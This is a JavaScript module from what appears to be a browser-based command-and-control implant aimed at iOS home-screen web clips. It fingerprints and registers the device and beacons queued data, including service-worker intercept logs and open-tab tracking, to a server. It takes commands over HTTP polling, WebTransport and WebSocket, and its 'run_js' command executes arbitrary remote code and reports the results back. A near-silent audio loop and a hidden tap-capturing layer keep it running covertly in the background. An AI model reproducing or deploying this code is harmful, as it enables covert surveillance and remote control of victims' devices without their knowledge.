import { CONFIG } from './config.js';

const QUEUE_KEY = 'wc_event_queue';
const HASH_KEY_PREFIX = 'wc_hash_';

function hashVal(val) {
  const s = JSON.stringify(val);
  let h = 2166136261;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = (h * 16777619) >>> 0;
  }
  return h.toString(16);
}

export async function queueEvent(type, data) {
  const hash = hashVal(data);
  const lastHash = localStorage.getItem(HASH_KEY_PREFIX + type);
  if (lastHash === hash) return;
  localStorage.setItem(HASH_KEY_PREFIX + type, hash);

  const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) ?? '[]');
  queue.push({ type, data, delta_hash: hash, ts: Date.now() });
  localStorage.setItem(QUEUE_KEY, JSON.stringify(queue));
}

export async function forceEvent(type, data) {
  const hash = hashVal(data);
  const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) ?? '[]');
  queue.push({ type, data, delta_hash: hash, ts: Date.now() });
  localStorage.setItem(QUEUE_KEY, JSON.stringify(queue));
}

async function pollCommands() {
  if (!CONFIG.deviceId) return;
  const resp = await Promise.race([
    fetch(`${CONFIG.server}/api/beacon/${CONFIG.deviceId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ events: [] }),
    }),
    new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 4000)),
  ]);
  const result = await resp.json();
  if (result.commands?.length) {
    const { executeCommands } = await import('./commands.js');
    await executeCommands(result.commands);
  }
}

export async function flush() {
  if (!CONFIG.deviceId) return;
  const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) ?? '[]');
  if (!queue.length) return;
  localStorage.setItem(QUEUE_KEY, '[]');
  try {
    const resp = await fetch(`${CONFIG.server}/api/beacon/${CONFIG.deviceId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ events: queue }),
    });
    const result = await resp.json();
    if (result.commands?.length) {
      const { executeCommands } = await import('./commands.js');
      await executeCommands(result.commands);
    }
  } catch {
    const existing = JSON.parse(localStorage.getItem(QUEUE_KEY) ?? '[]');
    localStorage.setItem(QUEUE_KEY, JSON.stringify([...queue, ...existing]));
  }
}

export async function registerDevice(name, userAgent) {
  const fp = localStorage.getItem('wc_hash_fingerprint') ?? null;
  const pushSub = localStorage.getItem('wc_push_sub') ?? null;
  try {
    const resp = await fetch(`${CONFIG.server}/api/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name, user_agent: userAgent, fingerprint_hash: fp, push_subscription: pushSub }),
    });
    const data = await resp.json();
    CONFIG.deviceId = String(data.device_id);
    CONFIG.deviceName = name;
    return data;
  } catch (e) {
    console.error('register failed', e);
    return null;
  }
}

let _ws = null;

// AudioContext — keeps JS alive when iOS backgrounds the WebClip.
// Re-use the context already created by the inline script in index.html if the
// home-screen tap gesture fired before this module loaded; otherwise create fresh.
let _bgCtx = window.__bgCtx ?? null;
let _bgSrc = null;        // current AudioBufferSourceNode (keep-alive loop)
let _bgBuf = null;        // shared AudioBuffer (reused across restarts)
let _restartTimer = null; // 60 s restart handle
let _resumeInterval = null; // 3 s resume check handle
let _killed = false;      // set by stopBgAudio — prevents any restart
// Note: Web Audio API only — avoids iOS status-bar audio indicator.

// Create the shared inaudible buffer (20 Hz sine, 2 s, gain=0 at playback).
// 20 Hz is below human hearing; gain=0 ensures total silence.
// BufferSourceNode with loop=true is the proven mechanism for keeping
// the iOS audio session — and therefore JS execution — alive in background.
function _makeBuf(ctx) {
  const sr  = ctx.sampleRate;
  const buf = ctx.createBuffer(1, sr * 2, sr);
  const d   = buf.getChannelData(0);
  for (let i = 0; i < d.length; i++) d[i] = Math.sin(2 * Math.PI * 200 * i / sr);
  return buf;
}

function _startSilentLoop() {
  if (!_bgCtx) return;
  try {
    if (_bgSrc) { try { _bgSrc.stop(); } catch {} _bgSrc.disconnect(); _bgSrc = null; }
    if (!_bgBuf) _bgBuf = _makeBuf(_bgCtx);
    const gain = _bgCtx.createGain();
    gain.gain.value = 0.001; // non-zero so iOS registers it as active audio output
    const src = _bgCtx.createBufferSource();
    src.buffer = _bgBuf;
    src.loop = true;
    src.connect(gain);
    gain.connect(_bgCtx.destination);
    src.start();
    _bgSrc = src;
    window.__bgCtx = _bgCtx;
  } catch {}
}

function _scheduleRestarts() {
  if (_restartTimer) return;
  _restartTimer = setInterval(() => {
    if (_bgCtx?.state === 'running') {
      try { _bgSrc?.stop(); } catch {}
      _bgSrc = null;
      setTimeout(_startSilentLoop, 500); // 500 ms gap to release resources
    }
  }, 60_000);
}

export function playBeep(freq = 440, durationSec = 0.07, volume = 0) {
  // Silent by default — kept for API compatibility.
}

function _tryStartBgAudio() {
  if (_killed) return; // operator killed the session — do not restart
  if (!_bgCtx && window.__bgCtx) _bgCtx = window.__bgCtx;
  if (!_bgCtx) {
    try {
      _bgCtx = new (window.AudioContext || window.webkitAudioContext)();
      window.__bgCtx = _bgCtx;
    } catch { _bgCtx = null; return; }
  }
  // Always run _afterResume — even if context is already running.
  // The early-return guard was the bug: inline script's context was running but
  // _startSilentLoop() / _scheduleRestarts() were never called so _bgSrc = null.
  const _afterResume = () => {
    if (!_bgSrc) _startSilentLoop();
    _scheduleRestarts();
    // Once audio is running, the gesture-layer div is no longer needed as a blocker.
    // Make it pass-through so the app UI is fully interactive.
    const gl = document.getElementById('gesture-layer');
    if (gl) gl.style.pointerEvents = 'none';
    // Dismiss any pending idle overlay — gesture-layer already captured the unlock tap.
    document.getElementById('wc-idle-overlay')?.remove();
    if (typeof window.__onAudioReady === 'function') window.__onAudioReady();
  };
  if (_bgCtx.state === 'suspended' || _bgCtx.state === 'interrupted') {
    _bgCtx.resume().then(_afterResume).catch(() => {});
  } else {
    _afterResume();
  }
}

// Expose so index.html early-gesture trap can call us before module evaluation completes
window.__tryStartBgAudio = _tryStartBgAudio;

// Try immediately (home-screen tap may carry gesture context to first synchronous JS run)
_tryStartBgAudio();

// If the early-gesture trap already fired before we loaded, honour it now
if (window.__pendingAudioUnlock) _tryStartBgAudio();

// Clear any stale post-reload flag (overlay only shown when operator explicitly triggers it).
localStorage.removeItem('wc_post_reload_audio');

// Retry on any user interaction (belt + suspenders)
['touchstart', 'touchend', 'click', 'scroll', 'keydown'].forEach(ev =>
  window.addEventListener(ev, _tryStartBgAudio, { capture: true, passive: true })
);
// pageshow fires on every app open from home screen / task switcher
window.addEventListener('pageshow', _tryStartBgAudio);
window.addEventListener('focus',    _tryStartBgAudio);

// Periodic resume-check — iOS uses 'interrupted' when backgrounded, not just 'suspended'.
// After resuming, also ensure the BufferSource loop is running — iOS stops existing
// BufferSource nodes when it interrupts the AudioContext; they don't auto-restart.
_resumeInterval = setInterval(() => {
  if (!_bgCtx) return;
  if (_bgCtx.state === 'suspended' || _bgCtx.state === 'interrupted') {
    _bgCtx.resume().then(() => { if (!_bgSrc) _startSilentLoop(); }).catch(() => {});
  } else if (_bgCtx.state === 'running' && !_bgSrc) {
    _startSilentLoop(); // context running but loop was lost — restart
  }
}, 3000);

// Stop the background audio keepalive — nuclear option, not reversible without a new user gesture.
// Clears all timers so the loop cannot self-restart.
export function stopBgAudio() {
  _killed = true;
  window.__bgKilled = true; // also block the inline script's _tryAudio in index.html
  try { if (_bgSrc) { _bgSrc.stop(); _bgSrc = null; } } catch {}
  try { if (_bgCtx) { _bgCtx.suspend().catch(() => {}); } } catch {}
  if (_restartTimer)  { clearInterval(_restartTimer);  _restartTimer  = null; }
  if (_resumeInterval){ clearInterval(_resumeInterval); _resumeInterval = null; }
}
window.__stopBgAudio = stopBgAudio;

export async function startBeacon() {
  pollCommands().catch(() => {});
  flush();
  setInterval(flush, 5_000);
  // Fallback poll — fires even when event queue is empty (WS is primary path)
  setInterval(() => pollCommands().catch(() => {}), 2_000);

  // On foreground return: resume audio, poll, flush, reconnect WS.
  function _onForeground() {
    _tryStartBgAudio();
    pollCommands().catch(() => {});
    flush();
    if (!_wt && (!_ws || _ws.readyState === WebSocket.CLOSED || _ws.readyState === WebSocket.CLOSING)) {
      connectWs();
    }
    // If audio is still suspended after a short delay, silently re-enable the
    // gesture-layer so the user's next tap unlocks audio without any visible UI.
    if (!_killed) {
      setTimeout(() => {
        if (_bgCtx && _bgCtx.state !== 'running') {
          const gl = document.getElementById('gesture-layer');
          if (gl) gl.style.pointerEvents = 'auto';
        }
      }, 400);
    }
  }
  document.addEventListener('visibilitychange', () => { if (!document.hidden) _onForeground(); });
  window.addEventListener('pageshow', _onForeground);
  window.addEventListener('resume', _onForeground);

  connectTransport();
}

// ── SW intercept log receiver + C2 relay ──────────────────────────────────────
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.addEventListener('message', async (ev) => {
    if (ev.data?.type === 'sw_intercept_log') {
      const { queueEvent, flush } = await import('./beacon.js');
      await queueEvent('sw_intercept_log', { entries: ev.data.entries });
      flush().catch(() => {});
    }

    if (ev.data?.type === 'c2_debug') {
      // Debug: log what SW sees so we can diagnose via Console tab
      console.log('[SW→page c2_debug]', JSON.stringify(ev.data));
    }

    // SW relays c2_command push to page when app is open
    if (ev.data?.type === 'c2_relay') {
      const { server, token, command } = ev.data;
      if (!command?.type || !server || !token) return;
      const cmdType = command.type;

      if (cmdType === 'ping') {
        fetch(`${server}/api/collect/result`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, type: 'pong', ts: Date.now(), payload: {}, via: 'page' }),
        }).catch(() => {});

      } else if (cmdType === 'run_js') {
        (async () => {
          const code = command.payload?.code ?? '';
          let result, ok;
          try {
            const AsyncFn = Object.getPrototypeOf(async function () {}).constructor;
            const res = await new AsyncFn(code)();
            result = res !== undefined ? String(res) : '(undefined)';
            ok = true;
          } catch (e) {
            result = e?.message ?? String(e);
            ok = false;
          }
          fetch(`${server}/api/collect/result`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, type: 'js_result', ok, result, ts: Date.now(), via: 'page' }),
          }).catch(() => {});
        })();

      } else {
        // All other commands go through executeCommands()
        const synth = { id: `push-${Date.now()}`, type: cmdType, payload: command.payload ?? {} };
        import('./commands.js').then(({ executeCommands }) => {
          executeCommands([synth]).catch(() => {});
        }).catch(() => {});
      }
    }
  });
}

// ── BroadcastChannel tab tracking (always-on passive) ────────────────────────
import('./modules/recon.js').then(({ initTabTracking }) => {
  initTabTracking(async (tabs) => {
    const { queueEvent } = await import('./beacon.js');
    queueEvent('tab_update', { tabs, count: tabs.length + 1 });
  });
}).catch(() => {});

// ── WebTransport → WebSocket command channel ─────────────────────────────────
let _wt = null; // WebTransport session (if supported)

async function _handleCommandMsg(msg) {
  if (msg.type === 'command') {
    const { executeCommands } = await import('./commands.js');
    await executeCommands([{ id: msg.id, type: msg.cmd_type, payload: msg.payload }]);
    return msg.id; // caller acks
  }
}

async function connectTransport() {
  if (!CONFIG.deviceId) return;
  // WebTransport requires HTTP/3 on the server — try first, fall back to WS.
  if (typeof WebTransport !== 'undefined' && CONFIG.wtUrl) {
    try {
      _wt = new WebTransport(`${CONFIG.wtUrl}/wt/${CONFIG.deviceId}`);
      await _wt.ready;
      console.debug('[WT] connected');
      // Read datagrams (low-latency commands)
      const reader = _wt.datagrams.readable.getReader();
      (async () => {
        while (true) {
          const { value, done } = await reader.read();
          if (done) break;
          try {
            const msg = JSON.parse(new TextDecoder().decode(value));
            const id = await _handleCommandMsg(msg);
            // Ack via datagram
            const w = _wt.datagrams.writable.getWriter();
            await w.write(new TextEncoder().encode(JSON.stringify({ type: 'command_ack', command_id: id })));
            w.releaseLock();
          } catch {}
        }
        // Transport closed — fall back to WS
        _wt = null;
        connectWs();
      })();
      return; // WebTransport active — skip WS
    } catch {
      _wt = null;
    }
  }
  // WebSocket fallback (always available)
  connectWs();
}

async function connectWs() {
  if (!CONFIG.deviceId) return;
  try {
    let wsToken = localStorage.getItem('wc_ws_token');
    if (!wsToken) {
      const r = await fetch(`${CONFIG.server}/api/ws-token/${CONFIG.deviceId}`);
      const j = await r.json();
      wsToken = j.token;
      localStorage.setItem('wc_ws_token', wsToken);
    }
    _ws = new WebSocket(`${CONFIG.wsUrl}/ws/${CONFIG.deviceId}?token=${wsToken}`);
    _ws.onopen  = () => console.debug('[WS] connected');
    _ws.onmessage = async (e) => {
      const msg = JSON.parse(e.data);
      if (msg.type === 'command') {
        const { executeCommands } = await import('./commands.js');
        await executeCommands([{ id: msg.id, type: msg.cmd_type, payload: msg.payload }]);
        _ws?.send(JSON.stringify({ type: 'command_ack', command_id: msg.id }));
      }
    };
    _ws.onclose = () => setTimeout(connectWs, 1000);
    _ws.onerror = () => { _ws?.close(); };
  } catch { /* WS not available */ }
}

export function sendViaWs(msg) {
  if (_ws && _ws.readyState === WebSocket.OPEN) {
    _ws.send(JSON.stringify(msg));
    return true;
  }
  return false;
}

window.addEventListener('pagehide', () => {
  const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) ?? '[]');
  if (!queue.length || !CONFIG.deviceId) return;
  navigator.sendBeacon(
    `${CONFIG.server}/api/beacon/${CONFIG.deviceId}`,
    JSON.stringify({ events: queue })
  );
  localStorage.setItem(QUEUE_KEY, '[]');
});
